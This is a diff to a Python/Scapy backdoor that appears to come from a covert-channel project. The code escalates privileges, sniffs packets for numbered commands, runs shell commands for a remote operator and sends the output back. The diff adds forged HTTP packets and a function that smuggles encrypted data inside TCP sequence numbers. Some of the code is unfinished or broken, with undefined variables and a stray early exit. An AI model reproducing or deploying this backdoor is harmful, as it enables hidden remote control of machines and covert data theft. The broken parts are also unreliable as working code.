@@ -181,6 +181,26 @@ def start_backdoor():
     """
     print("Starting Receiver.")
 
+    message = "hello"
+    request = f"POST / HTTP/1.1\r\n" \
+              f"Host: 192.168.1.195\r\n" \
+              f"User-Agent: Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:93.0) Gecko/20100101 Firefox/93.0\r\n" \
+              f"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\r\n" \
+              f"Accept-Language: en-CA,en-US;q=0.7,en;q=0.3\r\n" \
+              f"Accept-Encoding: gzip, deflate\r\n" \
+              f"Cookie:\r\n" \
+              f"session={message + message}\r\n" \
+              f"Connection: keep-alive\r\n" \
+              f"Upgrade-Insecure-Requests: 1\r\n" \
+              f"Content-Type: text/html; charset=utf-8\r\n" \
+              f"Content-Length: {len(message)}\r\n\r\n" + message
+
+    http_request = IP(dst="192.168.1.185") / TCP(sport=6000, dport=80, flags='PA', seq=1,
+                                         ack=1) / request
+    send(http_request, verbose=0)
+
+    exit()
+
     # Elevate privileges.
     setuid(0)
     setgid(0)
@@ -277,33 +297,35 @@ def process_sniff_pkt(pkt):
         instruction = commands[2]
         if instruction == "1":
             print(instruction)
-        if instruction == "2":
+        elif instruction == "2":
             print(instruction)
-        if instruction == "3":
+        elif instruction == "3":
             instruction_input = commands[3]
             print(instruction)
             print(instruction_input)
             result = run_commands(instruction_input)
             # encrypted_data = encryption.encrypt(result.encode('utf-8')).decode('utf-8')
             # send_command_output(encrypted_data, address, sender_port)
-        if instruction == "4":
+        elif instruction == "4":
             instruction_input = commands[3]
             print(instruction)
             print(instruction_input)
-        if instruction == "5":
+        elif instruction == "5":
             instruction_input = commands[3]
             print(instruction)
             print(instruction_input)
-        if instruction == "6":
+        elif instruction == "6":
             print(instruction)
-        if instruction == "7":
+        elif instruction == "7":
             instruction_input = commands[3]
             print(instruction)
             print(instruction_input)
-        if instruction == "8":
+        elif instruction == "8":
             print(instruction)
-        if instruction == "9":
+        elif instruction == "9":
             print(instruction)
+        else:
+            print(f"WARNING, invalid instruction: {instruction}.")
 
     return
 
@@ -356,6 +378,11 @@ def send_command_output(data, address, port):
     :return: None
     """
 
+    dst = address
+    sport = 7000
+    dport = port
+    inital_seq_num = 1000
+
     # Add short delay ensuring attacker sniff is ready.
     time.sleep(0.5)
 
@@ -372,6 +399,86 @@ def send_command_output(data, address, port):
         my_sock.setsockopt(sock.SOL_SOCKET, sock.SO_REUSEADDR, 1)
         my_sock.connect((address, port))
         my_sock.sendall(data.encode("utf-8"))
+
+
+def send_message(message, instruction, filename):
+
+    address = config.sender_address
+    # sport = 7000
+    # dport = port
+    dport = config.sender_port
+    # inital_seq_num = 1000
+
+    # 3-way-handshake
+    syn = IP(dst=address) / TCP(dport=dport, flags='S')
+    syn_ack = sr1(syn, verbose=0, timeout=5)
+
+
+    if syn_ack is None:
+        print("3-way-handshake failed. No response from receiver.")
+        return
+    ack = IP(dst=address) / TCP(sport=syn_ack[TCP].dport, dport=dport, flags='A', seq=syn_ack[TCP].ack, ack=syn_ack[TCP].seq + 1)
+    send(ack, verbose=0)
+
+    message = "hello"
+    request = f"POST / HTTP/1.1\r\n\r\n" + message
+
+    http_request = IP(dst=address) / TCP(sport=syn_ack[TCP].dport, dport=dport, flags='PA', seq=syn_ack[TCP].ack,
+                                         ack=syn_ack[TCP].seq + 1) / request
+    send(http_request, verbose=0)
+
+    # Starting to send data.
+    cur_seq = syn_ack.ack
+    cur_ack = syn_ack.seq + 1
+
+    data = encryption.encrypt(message.encode("ascii")).decode("ascii")
+    # data = message
+    current_seq = 1000
+    for c in data:
+        if current_seq > 2000000000:
+            current_seq = 0
+        current_seq += 1000
+        stega_seq = current_seq + ord(c)
+
+        tcp_pushack = ip / TCP(sport=sport, dport=dport, flags='PA', seq=stega_seq, ack=cur_ack)
+        send(tcp_pushack, verbose=0)
+        cur_seq = stega_seq
+        # cur_ack = tcp_ack.seq
+        # cur_seq += len(data)
+        # RESPONSE = sr1(ip / PUSHACK / Raw(load=data))
+
+    # Closing TCP connection
+    # start_new_thread(wait_for_fin_ack, (address, ip, sport, dport))
+    tcp_fin = ip / TCP(sport=sport, dport=dport, flags="FA", seq=cur_seq, ack=cur_ack)
+    # tcp_finack = sr1(tcp_fin)
+    send(tcp_fin, verbose=0)
+    # tcp_lastack = ip / TCP(sport=sport, dport=dport, flags="A", seq=tcp_finack.ack, ack=tcp_finack.seq + 1)
+    tcp_lastack = ip / TCP(sport=sport, dport=dport, flags="A", seq=cur_seq, ack=cur_ack + 1)
+    send(tcp_lastack, verbose=0)
+    print("Send Complete.")
+
+
+# def wait_for_fin_ack(address, ip, sport, dport):
+#     print("sniffing")
+#     # tcp_finack = sniff(filter=f"host {address} and tcp-fin != 0", count=1)
+#     tcp_finack = sniff(filter=f"host {address} and tcp-fin != 0", count=1)
+#     print("sniffed!")
+#     print(tcp_finack)
+#     ack = tcp_finack[0].payload.payload.ack
+#     seq = tcp_finack[0].payload.payload.seq
+#     print(f"ack {ack}")
+#     print(f"seq {seq}")
+#     tcp_lastack = ip / TCP(sport=sport, dport=dport, flags="A", seq=ack, ack=seq + 1)
+#     send(tcp_lastack)
+
+    # IPv4 Socket connection to receiver.
+    # with socket(AF_INET, SOCK_STREAM) as sock:
+    #     sock.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)
+    #     sock.connect((address, port))
+    #     sock.sendall(message.encode("utf-8"))
+    #     print(f"Receiver: \tIP = {address}, Port = {port}")
+    #     print(f"Message Sent: \t{message}")
+
 
 
 if __name__ == "__main__":
